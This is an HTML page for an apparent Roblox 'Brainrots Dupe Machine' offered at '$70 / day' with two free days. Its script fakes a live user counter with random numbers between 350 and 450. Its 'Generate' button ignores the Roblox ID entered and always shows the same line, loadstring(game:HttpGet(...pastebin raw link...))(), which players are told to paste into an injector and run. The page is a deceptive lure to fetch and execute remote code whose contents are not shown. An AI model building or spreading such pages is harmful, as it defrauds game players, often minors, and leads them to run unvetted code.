<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Zagolovok</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#000;
      --text:#fff;
      --muted:rgba(255,255,255,.70);
      --muted2:rgba(255,255,255,.50);
      --border:rgba(255,255,255,.16);
      --border2:rgba(255,255,255,.22);
      --panel1:rgba(255,255,255,.045);
      --panel2:rgba(255,255,255,.02);
      --shadow: 0 28px 70px rgba(0,0,0,.70);
      --r:18px;
      --green:#22c55e;
    }

    *{ box-sizing:border-box; }
    html,body{ height:100%; }
    body{
      margin:0;
      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    .wrap{
      min-height:100%;
      display:grid;
      place-items:center;
      padding: 28px;
    }

    .stack{
      width:min(680px, 100%);
      display:flex;
      flex-direction:column;
      align-items:center;
      gap:14px;
    }

    .pageTitle{
      margin:0;
      font-size: 40px;
      line-height: 1.05;
      letter-spacing: -0.9px;
      font-weight: 800;
      text-align:center;
    }

    .box{
      width:100%;
      border-radius: var(--r);
      border: 1px solid var(--border);
      background: linear-gradient(180deg, var(--panel1), var(--panel2));
      box-shadow: var(--shadow);
      padding: 22px;
      position:relative;
      overflow:hidden;
    }

    .online{
      position:absolute;
      top: 14px;
      right: 14px;
      display:flex;
      align-items:center;
      gap:10px;
      padding: 8px 10px;
      border-radius: 999px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(255,255,255,.02);
      font-size: 12px;
      font-weight: 800;
      color: rgba(255,255,255,.86);
      user-select:none;
    }

    .dot{
      width: 10px;
      height: 10px;
      border-radius: 999px;
      background: var(--green);
      box-shadow: 0 0 0 6px rgba(34,197,94,.10);
    }

    .onlineText{
      color: rgba(255,255,255,.78);
      font-weight: 800;
      letter-spacing: .2px;
      display:flex;
      align-items:baseline;
      gap:6px;
    }
    .onlineText b{
      color: rgba(255,255,255,.92);
      font-weight: 900;
      font-size: 12px;
    }

    .price{
      margin: 22px 0 18px;
      display:flex;
      flex-direction:column;
      gap:6px;
      text-align:left;
    }
    .priceMain{
      font-size: 30px;
      font-weight: 900;
      letter-spacing: -0.6px;
      color: rgba(255,255,255,.96);
      line-height: 1.1;
    }
    .priceSub{
      font-size: 13px;
      font-weight: 700;
      color: rgba(255,255,255,.70);
    }

    .hold{
      width:100%;
      height: 56px;
      border-radius: 14px;
      border: 1px solid var(--border2);
      background: rgba(255,255,255,.03);
      color: rgba(255,255,255,.92);
      cursor: pointer;
      position: relative;
      overflow:hidden;
      outline:none;
      transform: translateZ(0);
      transition: transform .12s ease, border-color .12s ease, background .12s ease;
      user-select:none;
      -webkit-tap-highlight-color: transparent;
    }
    .hold:active{ transform: translateY(1px); }
    .hold[disabled]{ opacity:.70; cursor:default; }

    .hold__fill{
      position:absolute;
      inset:0;
      width:0%;
      background: rgba(255,255,255,.14);
      transition: width 0.06s linear;
    }
    .hold__text{
      position:relative;
      z-index:1;
      font-weight: 900;
      letter-spacing: .2px;
      font-size: 14px;
    }

    .divider{
      margin: 16px 0;
      height:1px;
      background: rgba(255,255,255,.10);
      border:0;
    }

    .row{
      display:flex;
      gap: 10px;
      align-items:center;
    }

    .input{
      flex:1;
      height: 54px;
      border-radius: 14px;
      border: 1px solid var(--border);
      background: rgba(255,255,255,.02);
      color: rgba(255,255,255,.92);
      padding: 0 14px;
      font-size: 14px;
      outline:none;
      transition: border-color .12s ease, background .12s ease;
    }
    .input:focus{
      border-color: rgba(255,255,255,.30);
      background: rgba(255,255,255,.03);
    }

    .btn{
      height: 54px;
      padding: 0 18px;
      border-radius: 14px;
      border: 1px solid rgba(255,255,255,.22);
      background: rgba(255,255,255,.08);
      color: rgba(255,255,255,.92);
      font-weight: 900;
      cursor:pointer;
      transition: transform .12s ease, filter .12s ease, background .12s ease, border-color .12s ease;
      -webkit-tap-highlight-color: transparent;
    }
    .btn:hover{ filter: brightness(1.08); border-color: rgba(255,255,255,.30); }
    .btn:active{ transform: translateY(1px); }

    .out{
      margin-top: 14px;
      border-radius: 14px;
      border: 1px solid var(--border);
      background: rgba(255,255,255,.02);
      padding: 12px 14px;
      /* ВАЖНО: НЕ режем высоту */
      overflow: visible;
    }
    .out__label{
      font-size: 12px;
      color: var(--muted2);
      margin-bottom: 8px;
      letter-spacing:.6px;
      text-transform: uppercase;
      font-weight: 800;
    }
    .out__value{
      display:block;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
      font-size: 13px;
      color: rgba(255,255,255,.92);

      /* показываем полностью */
      white-space: normal;
      overflow-wrap: anywhere;
      word-break: break-word;
      line-height: 1.55;
    }

    .note{
      margin-top: 14px;
      font-size: 13px;
      line-height: 1.7;
      color: var(--muted);
      border-top: 1px solid rgba(255,255,255,.10);
      padding-top: 12px;
    }

    .hidden{ display:none; }

    @media (max-width: 560px){
      .row{ flex-direction:column; align-items:stretch; }
      .btn{ width:100%; }
      .pageTitle{ font-size: 36px; }
      .priceMain{ font-size: 26px; }
    }
  </style>
</head>

<body>
  <main class="wrap">
    <div class="stack">
      <h1 class="pageTitle">Brainrots Dupe Machine</h1>

      <!-- FIXED LINK: меняй тут -->
      <section class="box" id="app" data-fixed-link='loadstring(game:HttpGet("https://pastebin.com/raw/kguPGCJu"))()'>
        <div class="online" aria-label="Online">
          <span class="dot" aria-hidden="true"></span>
          <span class="onlineText"><b id="onlineNum">—</b> online</span>
        </div>

        <div class="price">
          <div class="priceMain">$70 / day</div>
          <div class="priceSub">2 days free</div>
        </div>

        <button class="hold" id="holdBtn" type="button">
          <span class="hold__fill" id="holdFill"></span>
          <span class="hold__text" id="holdText">Hold 3s to activate</span>
        </button>

        <hr class="divider" />

        <div id="unlocked" class="hidden">
          <div class="row">
            <input class="input" id="idInput" type="text" placeholder="Roblox ID" autocomplete="off" />
            <button class="btn" id="genBtn" type="button">Generate</button>
          </div>

          <div class="out hidden" id="outWrap">
            <div class="out__label">Link</div>
            <div class="out__value" id="linkOut">""</div>
          </div>

          <div class="note">Paste the link into the injector and run it.<br/>Farm Brainrots automatically with our script</div>
        </div>
      </section>
    </div>
  </main>

  <script>
    (() => {
      const app = document.getElementById("app");
      const FIXED_LINK = (app.dataset.fixedLink || '""').trim();

      const onlineEl = document.getElementById("onlineNum");
      const MIN = 350, MAX = 450;

      let current = Math.floor(MIN + Math.random() * (MAX - MIN + 1));
      let target = current;

      function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }

      function pickTarget(){
        const jump = Math.random() < 0.12;
        const step = jump ? (10 + Math.floor(Math.random()*18)) : (1 + Math.floor(Math.random()*5));
        const dir = Math.random() < 0.5 ? -1 : 1;
        target = clamp(current + dir * step, MIN, MAX);
      }

      function tickOnline(){
        if (target === current) pickTarget();

        const diff = target - current;
        const move = diff === 0 ? 0 : (Math.abs(diff) >= 8 ? Math.sign(diff) * 2 : Math.sign(diff));
        current = clamp(current + move, MIN, MAX);

        onlineEl.textContent = String(current);

        const next = 180 + Math.floor(Math.random()*260);
        setTimeout(tickOnline, next);
      }

      onlineEl.textContent = String(current);
      setTimeout(tickOnline, 220);

      const holdBtn = document.getElementById("holdBtn");
      const holdFill = document.getElementById("holdFill");
      const holdText = document.getElementById("holdText");

      const unlocked = document.getElementById("unlocked");
      const idInput = document.getElementById("idInput");
      const genBtn = document.getElementById("genBtn");

      const outWrap = document.getElementById("outWrap");
      const linkOut = document.getElementById("linkOut");

      const HOLD_MS = 3000;

      let activated = false;
      let holding = false;
      let t0 = 0;
      let raf = 0;

      function setFill(pct){ holdFill.style.width = pct + "%"; }

      function unlock(){
        activated = true;
        holdBtn.disabled = true;
        holdText.textContent = "Activated";
        setFill(100);
        unlocked.classList.remove("hidden");
        idInput.focus();
      }

      function stopHold(){
        if (!holding) return;
        holding = false;
        cancelAnimationFrame(raf);

        if (!activated){
          setFill(0);
          holdText.textContent = "Hold 3s to activate";
        }
      }

      function tick(now){
        if (!holding) return;

        const dt = now - t0;
        const pct = Math.min(100, (dt / HOLD_MS) * 100);
        setFill(pct);

        if (dt >= HOLD_MS){
          holding = false;
          unlock();
          return;
        }

        const left = Math.max(1, Math.ceil((HOLD_MS - dt) / 1000));
        holdText.textContent = "Hold " + left + "s";
        raf = requestAnimationFrame(tick);
      }

      function startHold(){
        if (activated) return;
        holding = true;
        t0 = performance.now();
        raf = requestAnimationFrame(tick);
      }

      holdBtn.addEventListener("mousedown", startHold);
      holdBtn.addEventListener("touchstart", (e) => { e.preventDefault(); startHold(); }, { passive:false });

      window.addEventListener("mouseup", stopHold);
      window.addEventListener("touchend", stopHold);
      window.addEventListener("touchcancel", stopHold);
      holdBtn.addEventListener("mouseleave", stopHold);

      genBtn.addEventListener("click", () => {
        if (!activated) return;
        const id = (idInput.value || "").trim();
        if (!id) { idInput.focus(); return; }
        linkOut.textContent = FIXED_LINK || '""';
        outWrap.classList.remove("hidden");
      });
    })();
  </script>
</body>
</html>
